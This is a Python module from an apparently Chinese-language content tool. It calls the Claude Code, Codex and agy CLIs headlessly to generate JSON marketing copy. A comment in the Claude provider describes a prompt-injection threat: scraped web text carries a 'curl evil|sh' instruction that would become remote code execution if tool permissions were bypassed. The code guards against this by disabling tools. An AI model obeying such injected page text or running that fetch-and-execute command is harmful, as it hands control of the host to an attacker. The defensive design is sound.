"""真实 AI 驱动:用本机的 Claude Code / Codex CLI 无头生成内容。

设计要点(可用性优先):
  - 只有"创意"任务(默认 copy / ideation)真正调用 CLI,其余结构/打分/渲染
    任务走确定性 fallback(TemplateProvider)。这样单次生成仅 1~2 次 CLI 调用,
    响应时间可控;任何失败(超时/解析失败/CLI 缺失)都自动回退,绝不中断。
  - ClaudeCodeProvider:`claude -p <prompt> --output-format json`
  - CodexProvider:`codex exec --json <prompt>`(默认 model,低推理档,忽略用户 MCP 配置加速)

通过 env 可调:
  YOMINPOST_CLI_TASKS   哪些 task 交给 CLI(逗号分隔,默认 "copy,ideation")
  YOMINPOST_MODEL       模型别名(claude 默认 haiku)
  YOMINPOST_CLI_TIMEOUT 单次 CLI 超时秒(默认 120)
"""
from __future__ import annotations

import json
import logging
import os
import re
import subprocess
import tempfile

from .anthropic_provider import TASK_SPECS, _extract_json, _lang_directive, _mark_fallback
from .base import Provider
from .template_provider import TemplateProvider

log = logging.getLogger("yominpost.providers")

# Post Creating Loop 的 analyze/research/strategy 属于创意/判断类任务,默认走 CLI
DEFAULT_CLI_TASKS = "copy,ideation,plan,analyze,research,strategy"


def _cli_tasks() -> set[str]:
    raw = os.environ.get("YOMINPOST_CLI_TASKS", DEFAULT_CLI_TASKS)
    return {t.strip() for t in raw.split(",") if t.strip()}


def _timeout() -> int:
    try:
        return int(os.environ.get("YOMINPOST_CLI_TIMEOUT", "120"))
    except ValueError:
        return 120


def _build_prompt(task: str, ctx: dict) -> str:
    goal, schema_hint = TASK_SPECS[task]
    return (
        "你是 YominPost 的内容引擎。请只输出一个 JSON 对象,"
        "不要任何解释、不要 markdown 代码块、不要 <thinking>。" + _lang_directive(ctx) + "\n\n"
        f"任务:{goal}\n"
        f"必须严格符合此 JSON 结构:{schema_hint}\n\n"
        f"上下文(JSON):\n{json.dumps(ctx, ensure_ascii=False)[:6000]}"
    )


class CliProvider(Provider):
    """CLI 驱动基类。子类实现 _invoke(prompt) -> 原始文本。"""

    name = "cli"
    is_live = True

    def __init__(self, fallback: Provider | None = None, cli_tasks: set[str] | None = None):
        self.fallback = fallback or TemplateProvider()
        self.cli_tasks = cli_tasks if cli_tasks is not None else _cli_tasks()

    def _invoke(self, prompt: str) -> str:  # pragma: no cover - 子类实现
        raise NotImplementedError

    def run(self, task: str, ctx: dict) -> dict:
        if task not in self.cli_tasks or task not in TASK_SPECS:
            # 设计内分流(非故障):结构/打分类任务本来就走模板 —— 溯源标 template
            r = self.fallback.run(task, ctx)
            if isinstance(r, dict):
                r.setdefault("_meta", {"driver": "template", "live": False})
            return r
        reason = "empty parse"
        try:
            raw = self._invoke(_build_prompt(task, ctx))
            parsed = _extract_json(raw)
            if isinstance(parsed, dict) and parsed:
                # 补齐 char_count 等模板会算的字段
                if task == "copy":
                    # 值可能为 null(键在但值 None):用 `or ""` 兜底,避免 join(None) 抛错
                    full = "\n".join([str(parsed.get(k) or "") for k in ("hook", "body", "cta")])
                    parsed.setdefault("char_count", len(full))
                    parsed.setdefault("segments", [])
                    parsed.setdefault("hashtags", [])
                parsed["_meta"] = {"driver": self.name, "live": True}
                return parsed
        except Exception as e:  # noqa: BLE001
            reason = f"{type(e).__name__}: {e}"[:200]
        log.warning("%s task=%s fell back to template: %s", self.name, task, reason)
        return _mark_fallback(self.fallback.run(task, ctx), self.name, reason)


def _clean_env() -> dict:
    """去掉宿主 Claude Code 会话注入的变量——它们会把嵌套 CLI 指到会话代理导致 401。"""
    env = dict(os.environ)
    for k in list(env):
        if k == "ANTHROPIC_BASE_URL" or k == "CLAUDECODE" or k.startswith("CLAUDE_CODE_"):
            env.pop(k, None)
    return env


class ClaudeCodeProvider(CliProvider):
    name = "claude_code"

    def __init__(self, model: str = "haiku", **kw):
        super().__init__(**kw)
        self.model = model or "haiku"

    def _invoke(self, prompt: str) -> str:
        with tempfile.TemporaryDirectory() as wd:  # 空目录:避免加载项目 CLAUDE.md
            # ⚠️ 绝不用 --permission-mode bypassPermissions:prompt 里内联了抓取自任意
            # 用户 URL 的网页正文(ctx.material),恶意页面可注入"运行 curl evil|sh"指令;
            # bypass 会让嵌套 claude 无提示执行工具 → 远程注入即 RCE。这是纯文本生成任务,
            # 不需要任何工具:禁用全部工具,并用 default 模式(headless 下需批准的工具一律拒绝)。
            proc = subprocess.run(
                ["claude", "-p", prompt, "--output-format", "json",
                 "--model", self.model, "--permission-mode", "default",
                 "--disallowedTools", "Bash,Edit,Write,Read,WebFetch,WebSearch"],
                capture_output=True, text=True, timeout=_timeout(), cwd=wd,
                env=_clean_env(), stdin=subprocess.DEVNULL,
            )
        if proc.returncode != 0:
            raise RuntimeError(f"claude exit {proc.returncode}: {proc.stderr[:200]}")
        env = json.loads(proc.stdout)
        if isinstance(env, dict) and env.get("is_error"):
            # 未登录/401 等:envelope 正常但 result 是错误文案,必须显式失败
            raise RuntimeError(f"claude error: {str(env.get('result', ''))[:200]}")
        return env.get("result", "") if isinstance(env, dict) else proc.stdout


class CodexProvider(CliProvider):
    name = "codex"

    def __init__(self, model: str = "", **kw):
        super().__init__(**kw)
        self.model = model  # 空=用账户默认 model

    def _invoke(self, prompt: str) -> str:
        cmd = ["codex", "exec", "--json", "--skip-git-repo-check",
               "-s", "read-only",
               "-c", "model_reasoning_effort=low", prompt]
        if self.model:
            cmd[3:3] = ["-m", self.model]
        with tempfile.TemporaryDirectory() as wd:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=max(_timeout(), 180), cwd=wd,
                                  stdin=subprocess.DEVNULL)
        # 解析事件流,取最后一条 agent_message
        text = ""
        for line in proc.stdout.splitlines():
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                ev = json.loads(line)
            except Exception:
                continue
            item = ev.get("item", {})
            if ev.get("type") == "item.completed" and item.get("type") == "agent_message":
                text = item.get("text", "") or text
        if not text:
            raise RuntimeError(f"codex no message: {proc.stderr[:200]}")
        return text


class AgyProvider(CliProvider):
    """agy CLI(Antigravity):`agy -p <prompt>` 非交互输出纯文本。"""

    name = "agy"

    def __init__(self, model: str = "", **kw):
        super().__init__(**kw)
        self.model = model  # 空=账户默认模型

    def _invoke(self, prompt: str) -> str:
        cmd = ["agy", "-p", prompt, "--print-timeout", f"{_timeout()}s"]
        if self.model:
            cmd += ["--model", self.model]
        with tempfile.TemporaryDirectory() as wd:  # 空目录:避免读取项目上下文
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=_timeout() + 30, cwd=wd, env=_clean_env(),
                                  stdin=subprocess.DEVNULL)
        out = (proc.stdout or "").strip()
        if proc.returncode != 0 or not out:
            raise RuntimeError(f"agy exit {proc.returncode}: {(proc.stderr or out)[:200]}")
        return out
